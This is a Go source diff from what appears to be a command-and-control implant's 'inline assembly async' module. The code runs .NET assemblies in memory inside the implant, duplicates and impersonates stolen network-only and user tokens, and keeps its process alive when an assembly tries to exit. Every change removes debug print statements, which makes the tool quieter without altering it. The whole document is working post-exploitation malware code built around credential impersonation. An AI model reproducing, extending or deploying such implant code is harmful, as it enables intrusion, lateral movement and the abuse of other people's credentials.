@@ -51,7 +51,6 @@ func captureCurrentAssemblyTokenContext() *AssemblyTokenContext {
 // applyAssemblyTokenContextWithDuplication applies the stored token context using token duplication
 func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext) (func(), syscall.Handle) {
 	if tokenContext == nil || globalTokenStore == nil {
-		fmt.Printf("[Assembly Async Token] No token context to apply\n")
 		return func() {}, 0
 	}
 
@@ -60,8 +59,6 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 
 	// Priority: Network-only token > Regular impersonation
 	if tokenContext.NetOnlyHandle != 0 {
-		fmt.Printf("[Assembly Async Token] Attempting to duplicate network-only token '%s' (handle: 0x%x)\n",
-			tokenContext.NetOnlyToken, tokenContext.NetOnlyHandle)
 
 		// First verify the source handle is still valid
 		globalTokenStore.mu.RLock()
@@ -69,7 +66,6 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 		globalTokenStore.mu.RUnlock()
 
 		if currentNetOnlyHandle == 0 {
-			fmt.Printf("[Assembly Async Token] ERROR: Network-only token handle is no longer valid in global store\n")
 			return func() {}, 0
 		}
 
@@ -84,7 +80,6 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 		)
 
 		if err != nil {
-			fmt.Printf("[Assembly Async Token] Failed to duplicate network-only token: %v\n", err)
 
 			// Try with different access rights
 			err2 := DuplicateTokenEx(
@@ -97,24 +92,18 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 			)
 
 			if err2 != nil {
-				fmt.Printf("[Assembly Async Token] Second attempt to duplicate also failed: %v\n", err2)
 				// As last resort, use the original handle
 				duplicatedToken = currentNetOnlyHandle
 				cleanupFunc = func() {
-					fmt.Printf("[Assembly Async Token] Using original handle - no cleanup needed\n")
 				}
 			} else {
-				fmt.Printf("[Assembly Async Token] Successfully duplicated token on second attempt\n")
 				cleanupFunc = func() {
 					CloseHandle(duplicatedToken)
-					fmt.Printf("[Assembly Async Token] Closed duplicated network-only token\n")
 				}
 			}
 		} else {
-			fmt.Printf("[Assembly Async Token] Successfully duplicated network-only token (new handle: 0x%x)\n", duplicatedToken)
 			cleanupFunc = func() {
 				CloseHandle(duplicatedToken)
-				fmt.Printf("[Assembly Async Token] Closed duplicated network-only token\n")
 			}
 		}
 
@@ -127,7 +116,6 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 		globalTokenStore.mu.RUnlock()
 
 		if exists {
-			fmt.Printf("[Assembly Async Token] Duplicating impersonation token '%s' for async assembly\n", tokenContext.ActiveToken)
 
 			// Duplicate the token for this specific async operation
 			err := DuplicateTokenEx(
@@ -140,17 +128,13 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 			)
 
 			if err != nil {
-				fmt.Printf("[Assembly Async Token] Failed to duplicate impersonation token: %v\n", err)
 				// Fall back to using the original handle
 				duplicatedToken = token
 				cleanupFunc = func() {
-					fmt.Printf("[Assembly Async Token] Using original handle - no cleanup needed\n")
 				}
 			} else {
-				fmt.Printf("[Assembly Async Token] Successfully duplicated impersonation token\n")
 				cleanupFunc = func() {
 					CloseHandle(duplicatedToken)
-					fmt.Printf("[Assembly Async Token] Closed duplicated impersonation token\n")
 				}
 			}
 
@@ -272,7 +256,6 @@ func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes [
 
 // executeWithAsyncPipeCapture captures output with protection against exit and token context
 func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes []byte, arguments []string, job *AssemblyJob, executionNumber int, hasRunfor bool, runforDuration int, tokenContext *AssemblyTokenContext) (int, error) {
-	fmt.Printf("[DEBUG ASYNC] Starting async pipe capture for job %s (runfor protection: %v)\n", job.ID, hasRunfor)
 
 	type execResult struct {
 		code int
@@ -286,7 +269,6 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 	if hasRunfor {
 		// Add 10 seconds buffer to the runfor duration
 		executionTimeout = time.Duration(runforDuration+10) * time.Second
-		fmt.Printf("[DEBUG ASYNC] Using runfor timeout: %v\n", executionTimeout)
 	}
 
 	// Run the entire execution in a goroutine
@@ -297,7 +279,6 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		defer func() {
 			// Recover from any panic/exit attempt
 			if r := recover(); r != nil {
-				fmt.Printf("[DEBUG ASYNC] Recovered from exit attempt: %v\n", r)
 				job.OutputMutex.Lock()
 				job.Output.WriteString(fmt.Sprintf("\n[+] Assembly completed (attempted to exit process - prevented)\n"))
 				job.OutputMutex.Unlock()
@@ -317,13 +298,10 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 				// Apply impersonation for this thread
 				err := ImpersonateLoggedOnUser(duplicatedTokenHandle)
 				if err != nil {
-					fmt.Printf("[Assembly Async] Failed to impersonate duplicated token: %v\n", err)
 				} else {
-					fmt.Printf("[Assembly Async] Successfully applied duplicated token impersonation\n")
 					// Ensure we revert after execution
 					defer func() {
 						RevertToSelf()
-						fmt.Printf("[Assembly Async] Reverted impersonation after assembly execution\n")
 					}()
 				}
 			}
@@ -343,7 +321,6 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 
 		err := syscall.CreatePipe(&readPipe, &writePipe, &sa, 1024*1024) // 1MB buffer
 		if err != nil {
-			fmt.Printf("[DEBUG ASYNC] Failed to create pipe: %v\n", err)
 			// Execute without capture but with protection
 			retCode, err := c.executeProtectedDirect(assemblyBytes, arguments, hasRunfor, runforDuration, duplicatedTokenHandle)
 			resultChan <- execResult{retCode, err}
@@ -379,7 +356,6 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			for {
 				select {
 				case <-stopReader:
-					fmt.Printf("[DEBUG ASYNC] Reader stopping (total read: %d bytes)\n", totalRead)
 					return
 				default:
 					var bytesRead uint32
@@ -400,7 +376,6 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 						job.Output.WriteString(output)
 						job.OutputMutex.Unlock()
 
-						fmt.Printf("[DEBUG ASYNC] Read %d bytes (total: %d)\n", bytesRead, totalRead)
 					} else {
 						// No data available, wait a bit
 						time.Sleep(50 * time.Millisecond)
@@ -410,7 +385,6 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		}()
 
 		// Execute the assembly with protection
-		fmt.Printf("[DEBUG ASYNC] Executing assembly with args: %v\n", arguments)
 
 		// Detect runtime version
 		targetRuntime := "v4"
@@ -426,7 +400,6 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		go func() {
 			defer func() {
 				if r := recover(); r != nil {
-					fmt.Printf("[DEBUG ASYNC] Assembly tried to exit: %v\n", r)
 					// Check if it's an expected exit (like from /runfor)
 					if hasRunfor {
 						job.OutputMutex.Lock()
@@ -443,9 +416,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			if duplicatedTokenHandle != 0 {
 				err := ImpersonateLoggedOnUser(duplicatedTokenHandle)
 				if err != nil {
-					fmt.Printf("[Assembly Async] Failed to impersonate in execution goroutine: %v\n", err)
 				} else {
-					fmt.Printf("[Assembly Async] Applied impersonation in execution goroutine\n")
 					defer RevertToSelf()
 				}
 			}
@@ -456,9 +427,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		// Wait for execution with appropriate timeout
 		select {
 		case <-execDone:
-			fmt.Printf("[DEBUG ASYNC] Assembly execution completed: retCode=%d, err=%v\n", retCode, execErr)
 		case <-time.After(executionTimeout):
-			fmt.Printf("[DEBUG ASYNC] Assembly execution timeout after %v\n", executionTimeout)
 			job.OutputMutex.Lock()
 			if hasRunfor {
 				job.Output.WriteString(fmt.Sprintf("\n[*] Execution completed after /runfor timeout (%v)\n", executionTimeout))
@@ -477,9 +446,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		close(stopReader)
 		select {
 		case <-readerDone:
-			fmt.Printf("[DEBUG ASYNC] Reader finished cleanly\n")
 		case <-time.After(2 * time.Second):
-			fmt.Printf("[DEBUG ASYNC] Reader timeout after 2 seconds\n")
 		}
 
 		// Restore handles
@@ -526,7 +493,6 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 	// Wait for execution to complete or cancellation
 	select {
 	case result := <-resultChan:
-		fmt.Printf("[DEBUG ASYNC] Execution completed normally\n")
 		return result.code, result.err
 
 	case <-job.CancelChan:
@@ -534,14 +500,12 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		job.OutputMutex.Lock()
 		job.Output.WriteString("\n[!] Execution cancelled by user\n")
 		job.OutputMutex.Unlock()
-		fmt.Printf("[DEBUG ASYNC] Execution cancelled by user\n")
 		return -1, fmt.Errorf("execution terminated by user")
 
 	case <-time.After(executionTimeout + 30*time.Second): // Add extra buffer
 		job.OutputMutex.Lock()
 		job.Output.WriteString(fmt.Sprintf("\n[!] Final timeout (%v)\n", executionTimeout+30*time.Second))
 		job.OutputMutex.Unlock()
-		fmt.Printf("[DEBUG ASYNC] Final timeout\n")
 		return -1, fmt.Errorf("execution timeout")
 	}
 }
@@ -567,7 +531,6 @@ func (c *InlineAssemblyAsyncCommand) executeProtectedDirect(assemblyBytes []byte
 	go func() {
 		defer func() {
 			if r := recover(); r != nil {
-				fmt.Printf("[DEBUG ASYNC] Direct execution recovered from exit: %v\n", r)
 				execErr = nil
 				retCode = 0
 			}
